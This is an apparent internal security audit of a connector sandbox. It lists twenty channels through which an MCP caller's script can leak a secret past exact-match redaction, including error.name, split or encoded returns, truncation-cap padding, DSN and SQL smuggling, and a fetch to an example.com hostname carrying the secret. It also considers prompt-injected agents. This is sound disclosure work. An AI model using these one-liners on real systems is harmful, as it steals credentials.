# Exfiltration channels for a connector secret

<!-- labels: wayfinder:research -->
parent: ../map.md
ticket: ../tickets/002-exfiltration-channel-inventory.md

Facts only — no fixes proposed. Every claim carries a `file:line`. Claims marked
**(verified by execution)** were proved by running `runInIsolate` directly against the
checked-out code, not read off comments; the transcripts are inlined below.

## Summary

Reachability is stated for the ticket's caller: an MCP client holding `connectors:use`
that authors arbitrary JavaScript for `run_connector`.

| # | Channel | Reachable? | What stops it | Effort to defeat the stopper |
|---|---------|-----------|---------------|------------------------------|
| 1 | `error.name` returned verbatim | **Yes — full plaintext, no perimeter needed** | Nothing. `name` is the one field of the result never passed through `redactSecrets` (`isolate.ts:496`) | Zero. `const e=new Error('x'); e.name=env.KEY; throw e` |
| 2 | Return value, transformed (base64/charcodes/arithmetic/reversed) | **Yes — full plaintext** | `redactDeep` is exact substring match only (`config.ts:190-197`) | Zero. Any encoding at all |
| 3 | Return value, split across strings/array elements | **Yes — full plaintext** | Same exact-match limitation | Zero. `[k.slice(0,4), k.slice(4)]` |
| 4 | Return value, numeric encoding | **Yes — full plaintext** | `redactDeep` deliberately skips numbers (`marshal.ts:117-120`, `marshal.ts:128`) | Zero. `[...k].map(c=>c.charCodeAt(0))` |
| 5 | Return value, exact literal string | No | `redactDeep` → `redactSecrets`, at any depth, keys included (`marshal.ts:122-136`) | Works as advertised; only the naive case is caught |
| 6 | Return value, secret as an object KEY | No | Keys are redacted (`marshal.ts:134`) | Works as advertised |
| 7 | Return string longer than 256 KB, secret straddling the cap | **Yes — leaks a chosen prefix** | Cap truncates *before* redaction (`marshal.ts:74-78` runs at `isolate.ts:469`, redaction at `isolate.ts:492`) | One run per prefix length; padding is caller-chosen |
| 8 | `logs`, secret split across two `console.log` calls | **Yes** | Lines are joined with `\n` then redacted (`isolate.ts:493`), so the `\n` breaks the match | Zero |
| 9 | `logs`, secret straddling the 256 KB output cap | **Yes — leaks a chosen prefix** | Same order bug: per-line truncation at `isolate.ts:389` happens before the redact at `isolate.ts:493` | Pad the buffer to the desired offset |
| 10 | `error.message` / `error.stack`, exact secret | No | Redacted (`isolate.ts:497-498`) | Works — but only for the literal |
| 11 | `error.message`, secret transformed then thrown | **Yes** | Exact-match redaction only | Zero — same as #2 |
| 12 | `denials[]`, transformed secret in a refused hostname | **Yes** | Denials are redacted (`isolate.ts:503`) but the denial text quotes the caller-supplied hostname (`perimeter.ts:80-82`) | Zero — `fetch('https://'+b64(k)+'.example.com')` |
| 13 | Outbound HTTP to an allowed host: path, query, headers, body | **Yes, unreviewed** | Only host+port (`hostFetch.ts:191`) and method+`pathname` (`hostFetch.ts:194`) are judged. Query, headers and body are never inspected | Requires the connector to list ≥1 host; nothing else |
| 14 | Outbound: an allowed host that reflects (`Location` header) | **Yes, and unredacted** | Response headers are redacted (`hostFetch.ts:236`) but `result.location` is assigned raw (`hostFetch.ts:245-246`) | Needs an allowed host that emits a `Location` echoing the request |
| 15 | `sql()` — secret smuggled inside a caller-built DSN | **Yes** | Only the DSN's *host:port* is gated (`hostSql.ts:68`); user/password/dbname are free text the caller chooses | Needs a DB reachable at an already-listed host |
| 16 | `sql()` — secret smuggled inside the query text | **Yes** | Read-only/single-statement guard (`postgres.ts:35-86`, `mysql.ts:25-72`) blocks writes, not literals: `SELECT '<secret>'` passes | Zero. Lands in the upstream DB's logs / `pg_stat_activity` |
| 17 | `mcp()` — secret in tool args or caller-set headers | **Yes** | Rides `hostFetch`, so only the host gate applies (`hostMcp.ts:49`); no per-tool allowlist is enforced at runtime | Needs a listed MCP host |
| 18 | Timing (`duration_ms`, `sleep()`) | Yes, but pointless | Nothing | Bits/second vs. #1's whole secret in one call |
| 19 | Response-size modulation | Yes, but pointless | Nothing | Same |
| 20 | Reading `env` at all | **Yes, by design** | Nothing — that is the feature (`isolate.ts:362-367`) | n/a |

Bottom line for the map's two threats: channels **1, 2, 3, 4, 8, 11** are one-liners that
need no network, no allowed host, and no cooperation from an upstream. A prompt-injected
agent and a motivated member are equally served by any of them. Everything downstream of
that (egress, SQL, side channels) is real but strictly harder than the direct channels, so
it does not change the risk picture.

---

## 0. What actually gets bound into `env`, and what the redaction list is

`executeConnectorScript` resolves the note's `env:` templates server-side and hands the
isolate the *resolved* strings (`service.ts:264-272`), while the redaction list is the raw
decrypted **secret values only**, not every env value (`service.ts:277`,
`isolate.ts:83-86`). So an env entry like `AUTH: "Bearer {{secret:KEY}}"` puts
`Bearer <plaintext>` in `env.AUTH`, and only the `<plaintext>` substring is a redaction
target. Secrets come from `ConnectorSecret` (`prisma/schema.prisma:150-163`), AES-256-GCM
under a single server-wide `SECRETS_KEY` (`lib/crypto/secrets.ts:27-46`); there is no key
ring and no per-connector key.

The isolate's reachable surface is `env`, `fetch`, `sql`, `sleep`, `mcp`, `console`
(`isolate.ts:401-417`). `env` is frozen (`isolate.ts:367`) — a confusion guard, not a
confidentiality one.

## 1. The return channel

### 1.1 What `redactSecrets` is

```ts
out = out.split(value).join('[redacted]')      // config.ts:194
```

A literal substring replace, per secret value, skipping empty strings (`config.ts:190-197`).
There is no normalisation, no encoding awareness, no minimum length, and no entropy check.

`redactDeep` walks the marshalled structure and applies it to **strings and object keys
only**; numbers and booleans are passed through untouched, deliberately (`marshal.ts:113-136`,
comment at `marshal.ts:117-120`). Depth is capped at 64, at which point the subtree becomes
the literal `[truncated]` (`marshal.ts:130`) — the same cap `marshalValue` already applied
(`marshal.ts:86-89`), so it is not a bypass.

### 1.2 What that does and does not cover — (verified by execution)

Run against `runInIsolate` with `env.KEY = 'SUPERSECRET123'` and
`redact: ['SUPERSECRET123']`:

```
code:   return { k: env.KEY,
                 split: [env.KEY.slice(0,4), env.KEY.slice(4)],
                 b64:   env.KEY.split('').map(c=>c.charCodeAt(0)) }
value:  {"k":"[redacted]",
         "split":["SUPE","RSECRET123"],
         "b64":[83,85,80,69,82,83,69,67,82,69,84,49,50,51]}

code:   return { [env.KEY]: 1 }
value:  {"[redacted]":1}
```

- **Exact match:** caught (`k`).
- **Object keys:** caught — the comment at `marshal.ts:121` is accurate.
- **Split strings:** not caught. Two adjacent array elements reconstruct trivially.
- **Numeric encoding:** not caught. `b64` above is the full plaintext in decimal.
- **Any other transform** (base64, hex, reverse, XOR, `.replace`) is the same case: the
  post-transform bytes never equal the pre-transform bytes, so `split(value)` finds nothing.

### 1.3 Depth and size caps that truncate *before* scrubbing — (verified by execution)

`marshalValue` clips any single string at `MARSHAL_LIMITS.maxStringChars` = 256 KB
(`marshal.ts:29`, `marshal.ts:74-78`). It runs at `isolate.ts:469`; `redactDeep` runs later,
at `isolate.ts:492`. A secret straddling the cut therefore has its tail removed *first*, and
the surviving prefix no longer matches:

```
code:   return 'x'.repeat(256*1024 - 6) + env.KEY
value:  …xxxxxxSUPERS          truncated=true
```

Six characters of the plaintext came back in clear. Padding length is caller-chosen, so a
prefix of any length up to `len-1` can be extracted, and repeated runs with different padding
reconstruct the whole value. Nothing rate-limits runs beyond the process-wide concurrency
gate of 4 (`isolate.ts:55`).

The node cap (100 000 values, `marshal.ts:26`) and depth cap behave the same way — they
replace content with `[truncated]` rather than exposing a partial secret, so they are not
themselves leaks; only the *string* cap cuts inside a value.

## 2. Logs, errors, stacks, denials

### 2.1 `error.name` — the one field that is never redacted — (verified by execution)

The result is assembled at `isolate.ts:490-505`:

```ts
error: error
  ? {
      name: error.name,                                        // isolate.ts:496  ← raw
      message: redactSecrets(error.message, redact),           // isolate.ts:497
      stack: error.stack ? redactSecrets(error.stack, redact) : null, // isolate.ts:498
    }
  : null,
```

`toRunError` takes `name` straight from whatever the isolate threw, with no constraint
beyond "is a string" (`isolate.ts:561-572`). The whole object is returned to the MCP caller
as `error` (`lib/mcp/tools.ts:1203`) and to the console route
(`app/api/communities/[spaceId]/connectors/[name]/test/route.ts:71`).

```
code:   const e = new Error('boom'); e.name = env.KEY; throw e
error:  {"name":"SUPERSECRET123","message":"boom","stack":"    at <anonymous> …"}
```

Full plaintext, one statement, no network, no allowed host, works on a `hosts: []`
documentation-only connector. **This is the single highest-value channel in the inventory.**
The existing tests assert redaction of `message` and `stack`
(`tests/connector-isolate.test.ts:133-141`) and never touch `name`.

Corollary — a host-capability error message can be laundered through the same field:

```
code:   try { await fetch(env.KEY) }
        catch (e) { const x = new Error('z'); x.name = e.message; throw x }
error.name: "fetch could not parse the URL: SUPERSECRET123"
```

(The uncaught form of that same error *is* redacted — `message` came back as
`fetch could not parse the URL: [redacted]` — which shows the redaction path works and the
`name` field is the hole, not the message construction. `hostFetch.ts:175` is the source of
that message.)

### 2.2 `logs` — truncation before scrubbing, and the join seam — (verified by execution)

`console.log` writes into a capped buffer: the line is clipped to whatever remains of
`SANDBOX_LIMITS.outputCapBytes` (256 KB, `config.ts:513`) at `isolate.ts:384-393`, i.e. at
*emission* time. Redaction happens once, over the joined buffer, at `isolate.ts:493`.

```
code:   console.log('x'.repeat(256*1024 - 5)); console.log(env.KEY); return 1
logs (tail): "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\nSUPE"   truncated=true
```

Same prefix leak as §1.3, independently reachable.

Separately, the join is `logs.join('\n')` — so `console.log(k.slice(0,4)); console.log(k.slice(4))`
produces `SUPE\nRSECRET123`, which no exact-match pass can catch. Zero effort.

### 2.3 `denials`

Denials are collected via `ctx.deny(...)` (`isolate.ts:334-337`), capped at 50
(`perimeter.ts:28`), and each is redacted on the way out (`isolate.ts:503`). The texts
themselves are built from admin-written `hosts:`/`allow:` values plus **the subject the
caller supplied**: `refuseHost` names the hostname the code asked for
(`perimeter.ts:80-82`), and `refusePath` names the method and path
(`perimeter.ts:110`). So a transformed secret placed in a hostname or path comes back inside
a denial string that exact-match redaction cannot touch. Same class as §1.2; no additional
capability required, and it works with `hosts: []`.

The SQL path is the deliberate exception: `hostSql` never names the refused host, because it
came out of a decrypted DSN (`hostSql.ts:36-40`, `hostSql.ts:69`), and the SSRF refusal is
replaced with a fixed sentence rather than the address-naming one (`hostSql.ts:74-78`). That
reasoning holds up under reading — it is the one place where the "denial may quote what the
admin wrote, never what the secret said" rule from `perimeter.ts:60-69` is actually honoured.

### 2.4 Errors that escape the run entirely

`ConnectorError`s thrown outside the isolate (missing secret, bad config, oversize script)
propagate to the tool layer and are surfaced by `mapConnectorError`
(`lib/mcp/tools.ts:212-217`). Their messages are constructed from secret *names*, not values
(`service.ts:214-219`, `service.ts:226-233`) — including the decryption-failure branch, which
explicitly refuses to leak the underlying reason. No leak found on this path.

Upstream errors from the SQL drivers are redacted against `[dsn, password]`
(`postgres.ts:127`, `postgres.ts:155`; `mysql.ts:88`, `mysql.ts:95`, `mysql.ts:131`) — note
this list is the DSN and its password, *not* the run's `redact` list; the run's list is then
applied again on the way out of the isolate.

### 2.5 The audit line

Every run writes one audit entry with the first 200 characters of the submitted code and an
outcome string (`service.ts:262`, `service.ts:279-285`, `service.ts:296-302`), readable via
`listConnectorCalls` (`service.ts:152-171`). The outcome embeds `result.error?.message`
(`service.ts:283`), which is already redacted — but only by exact match, and the audit line
is *not* re-redacted. It records nothing the caller did not already have.

## 3. Outbound egress inside an allowed perimeter

### 3.1 HTTP

The gate is, in order: scheme (`hostFetch.ts:177-179`), method against a fixed set
(`hostFetch.ts:181-184`), host+port against `hosts:` plus an SSRF check
(`hostFetch.ts:189-192` → `perimeter.ts:70-91`), and method+`url.pathname` against `allow:`
(`hostFetch.ts:194-195` → `perimeter.ts:101-111`).

What is **not** examined anywhere:

- **Query string.** `refusePath` receives `url.pathname` only (`hostFetch.ts:194`); `search`
  never reaches the gate.
- **Request body.** Only size-checked (`hostFetch.ts:199-208`).
- **Request headers.** Only name-shape, newline, count and byte checks
  (`hostFetch.ts:127-152`); values are arbitrary. A handful of connection headers are dropped
  (`hostFetch.ts:33`).
- **Path content when `allow:` is empty or prefix-shaped.** An empty `allow:` is host-gated
  only, explicitly not deny-all (`perimeter.ts:108`) — and the note in that comment says
  every post-v2 connector is written that way. A prefix rule matches by `startsWith`
  (`config.ts:155`), so arbitrary suffix content passes.

So for any connector that lists at least one host, a secret can leave in the query string,
a header, or the body with no review at all. Path traversal tricks are blocked
(`config.ts:137-143`) but that is an allowlist-integrity control, not a content control.

Redirects are not followed (`hostFetch.ts:217-221`), so a hostile `Location` cannot pull the
secret to an unlisted host by itself.

**Unredacted reflection.** Response header values are redacted (`hostFetch.ts:236`), but the
`location` field is assigned straight from the response (`hostFetch.ts:245-246`) with no
`redactSecrets`. An allowed host that echoes any part of the request into `Location` hands
the plaintext back through a field the redactor never sees. Reachable only with a cooperating
or reflective allowed host; note the same value *is* present in the redacted `headers` map,
so this is an inconsistency in one field rather than a new capability.

### 3.2 MCP

`mcp(url, headers)` is built on `hostFetch` (`hostMcp.ts:49`), so it inherits exactly the
host gate and nothing more. `headers` are caller-supplied and stringified without inspection
(`hostMcp.ts:110-116`), and tool `arguments` are whatever the code passes
(`hostMcp.ts:158-161`). The legacy per-tool `allow:` list parses (`config.ts:353-363`) but is
explicitly *not* enforced at runtime under v2 (`config.ts:623-631`). So: a secret can be
handed to any listed MCP host as a header or a tool argument.

### 3.3 SQL / DSN — where the DSN *is* the credential

`sql(dsn, query)` takes **both arguments from isolate code** (`isolate.ts:402`,
`hostSql.ts:46`). The docs tell the agent to pass the env var (`tools.ts:1175`), but nothing
requires it.

- **The DSN is caller-composed.** Only `url.hostname`/`port` are matched against `hosts:`
  (`hostSql.ts:68`) and then SSRF-checked (`hostSql.ts:72`). Username, password, database
  name and query parameters are never examined. `sql('postgres://x:'+env.KEY+'@<listed-host>:5432/db', 'select 1')`
  therefore ships the plaintext as a password to a host the note already allows. That host
  must be listed, which is the only thing standing in the way.
- **The query text is arbitrary.** The read-only guards reject multi-statement and
  non-`SELECT`-shaped SQL (`postgres.ts:35-86`, `mysql.ts:25-72`) and the query runs in a
  read-only transaction (`postgres.ts:132`, `mysql.ts:98`) — so the secret cannot be
  *written* into a table. But `SELECT '<secret>'` is a legal read statement, and it lands the
  plaintext in the upstream database's statement logs, `pg_stat_activity`,
  `pg_stat_statements`, and any query-audit tooling. Nothing in our code inspects literals.
  Effort to defeat: none; it is one legal query away, and the readback happens outside our
  system entirely.
- The compensating control on this path is the denial wording (§2.3), which is real but
  addresses the *reverse* direction — us leaking the DSN — not the caller pushing a secret
  out through it.

## 4. Side channels, ranked honestly

Against the map's two threats these are close to irrelevant, because channels 1–4 hand over
the entire secret in a single call with no network.

1. **Timing.** `duration_ms` is returned (`isolate.ts:504`, surfaced at
   `lib/mcp/tools.ts:1209`) and `sleep(ms)` is available (`isolate.ts:405`,
   `hostFetch.ts:102-116`), bounded only by the run deadline. A run can therefore encode bits
   in its own wall clock. Reachable, unbounded in principle, and completely unnecessary: it
   moves a few bits per run where `error.name` moves the whole value.
2. **Deliberate error construction.** Already covered — but note it is *not* a side channel
   here, it is a direct channel (`error.name` is verbatim). Rank: first, not last.
3. **Response-size modulation.** The caller controls the returned structure outright, so
   "modulating" its size is a strictly worse way of doing what §1 already does directly.
4. **Denial-count modulation.** `denials.length` is caller-controllable (up to 50,
   `perimeter.ts:28`) and is reported. Same verdict: a covert-channel construction with a
   direct channel sitting beside it.

For a **prompt-injected agent**, side channels are implausible: injected instructions produce
short, direct code, and the direct channels are one line each. For a **motivated member**,
they are equally unnecessary — the member sees the full tool result themselves.

## 5. Who can reach `run_connector` at all

| Gate | Where | Strength |
|------|-------|----------|
| OAuth scope `connectors:use` | `scopes.ts:56`; pre-dispatch challenge in `challenge.ts:65-104`; re-checked in `auth.ts:86-91` | Real, but granted by **the end user alone** at the consent screen (`app/api/oauth/authorize/route.ts:117`, `:138`, `:194`) — no admin approval, no space-owner approval. Any signed-in member can approve any client, including a self-registered one or a Client ID Metadata Document (`:122-129`) |
| Authenticated MCP identity | `auth.ts:29-56`, tokens are 1-hour HS256 (`tokens.ts:14`) | Real |
| Space membership | `resolveTarget` → `requireSpaceContext` → `resolveContext`, 403 for non-members (`context.ts:54-63`, `lib/notes/resolve.ts:69-72`) | Real, hard tenant boundary |
| Visibility of the connector note | `loadConnector` reads through `readVisible` (`service.ts:191`), which applies the folder lens (`contextService.ts:70-94`) | Real but weak in practice: a grandfathered/space-level read grant over the context root reaches `connectors/` unless someone explicitly restricted that folder (`lib/notes/access.ts:116-124`, `authz.ts:106-123`) |
| Admin role | **Not required.** `run_connector` performs no `isAdmin` check — only `list_connectors`' sibling read path and the *console* route are admin-gated (`app/api/communities/[spaceId]/connectors/[name]/test/route.ts:38-40`) | A plain member with a read grant and the scope executes with the connector's full secrets |
| Per-connector restriction | **None exists** beyond note visibility | — |
| Per-secret restriction | **None exists.** Every run receives every secret its note's `env:` references (`service.ts:264-272`); the only partition is which secrets the note names | — |
| Write access to the note | Admin-only (`contextService.ts:236-246`) — a member cannot author a connector that binds a different secret | Real, and it is the main thing keeping a member from pointing a perimeter wherever they like |

Discovery is cheap: `list_connectors` needs only `context:read` (`scopes.ts:55`) and returns
each connector's hosts, allow rules and **secret NAMES** (`service.ts:87`,
`service.ts:35-52`) plus 4 000 characters of docs (`service.ts:33`, `service.ts:88`). Values
are never returned by any API (`lib/crypto/secrets.ts:7-9`,
`app/api/communities/[spaceId]/secrets/route.ts:22`).

Two callers share one execution path with identical redaction and identical perimeter — the
MCP tool (`lib/mcp/tools.ts:1194-1215`) and the admin console terminal
(`app/api/communities/[spaceId]/connectors/[name]/test/route.ts:65-77`). The connector-building
agent (`lib/connectors/agent.ts:201-219`) is a third caller of the same
`executeConnectorScript`, rendering `result.error?.message` and `result.logs` — it never sees
`error.name`, so it does not add a channel, but it does run agent-authored code with secrets
bound.

## 6. Reproduction transcript

Run from `apps/web`, against the working tree as of this ticket:

```
node --import tsx --input-type=module -e "
import { runInIsolate } from './lib/connectors/isolate.ts'
const p = { hosts: [], allow: [], allowPrivate: false,
            env: { KEY: 'SUPERSECRET123' }, timeoutMs: 5000 }
const o = { redact: ['SUPERSECRET123'] }
console.log((await runInIsolate(p, \"const e=new Error('boom'); e.name=env.KEY; throw e\", o)).error)
console.log((await runInIsolate(p, \"return [env.KEY.slice(0,4), env.KEY.slice(4)]\", o)).value)
console.log((await runInIsolate(p, \"return 'x'.repeat(256*1024-6)+env.KEY\", o)).value.slice(-12))
"
```

Observed:

```
{ name: 'SUPERSECRET123', message: 'boom', stack: '    at <anonymous> (eval.js:…)' }
[ 'SUPE', 'RSECRET123' ]
xxxxxxSUPERS
```

Note the perimeter here is `hosts: []` — a documentation-only connector with no network at
all still leaks its full secret through channel #1.
